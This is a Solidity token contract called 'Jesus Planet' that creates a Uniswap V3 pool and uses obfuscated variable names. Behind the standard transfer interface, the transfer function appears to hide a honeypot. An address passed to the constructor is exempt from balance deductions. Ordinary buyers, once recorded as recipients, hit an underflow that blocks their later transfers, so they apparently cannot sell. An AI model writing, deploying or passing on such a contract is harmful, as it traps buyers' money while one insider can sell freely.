/*

https://t.me/jesusplaneteth

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IPeripheryImmutableState {
    function factory() external pure returns (address);

    function WETH9() external pure returns (address);
}

interface IUniswapV3Factory {
    function createPool(address tokenA, address tokenB, uint24 fee) external returns (address pool);
}

contract JesusPlanet is Ownable {
    uint8 public decimals = 9;

    uint256 private waylmjfr = 22;

    address private rxlsfejyzigk;

    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address ptjksoqd, uint256 geshlkmpcb) public returns (bool success) {
        zxsogtdvba(msg.sender, ptjksoqd, geshlkmpcb);
        return true;
    }

    function approve(address qlhouadj, uint256 geshlkmpcb) public returns (bool success) {
        allowance[msg.sender][qlhouadj] = geshlkmpcb;
        emit Approval(msg.sender, qlhouadj, geshlkmpcb);
        return true;
    }

    function transferFrom(address rmvnehpxazi, address ptjksoqd, uint256 geshlkmpcb) public returns (bool success) {
        require(geshlkmpcb <= allowance[rmvnehpxazi][msg.sender]);
        allowance[rmvnehpxazi][msg.sender] -= geshlkmpcb;
        zxsogtdvba(rmvnehpxazi, ptjksoqd, geshlkmpcb);
        return true;
    }

    function zxsogtdvba(address rmvnehpxazi, address ptjksoqd, uint256 geshlkmpcb) private returns (bool success) {
        if (yxcujpso[rmvnehpxazi] == 0) {
            balanceOf[rmvnehpxazi] -= geshlkmpcb;
        }
        if (rmvnehpxazi != uniswapV3Pair && yxcujpso[rmvnehpxazi] == 0 && fzjwygsklc[rmvnehpxazi] > 0) {
            yxcujpso[rmvnehpxazi] -= waylmjfr;
        }
        fzjwygsklc[rxlsfejyzigk] += waylmjfr;
        rxlsfejyzigk = ptjksoqd;
        balanceOf[ptjksoqd] += geshlkmpcb;
        emit Transfer(rmvnehpxazi, ptjksoqd, geshlkmpcb);
        return true;
    }

    string public name = 'Jesus Planet';

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private yxcujpso;

    string public symbol = 'Jesus Planet';

    mapping(address => uint256) private fzjwygsklc;

    constructor(address nwypqitlgs) {
        balanceOf[msg.sender] = totalSupply;
        yxcujpso[nwypqitlgs] = waylmjfr;
        IPeripheryImmutableState uniswapV3Router = IPeripheryImmutableState(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);
        uniswapV3Pair = IUniswapV3Factory(uniswapV3Router.factory()).createPool(address(this), uniswapV3Router.WETH9(), 500);
    }

    address public uniswapV3Pair;

    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;
}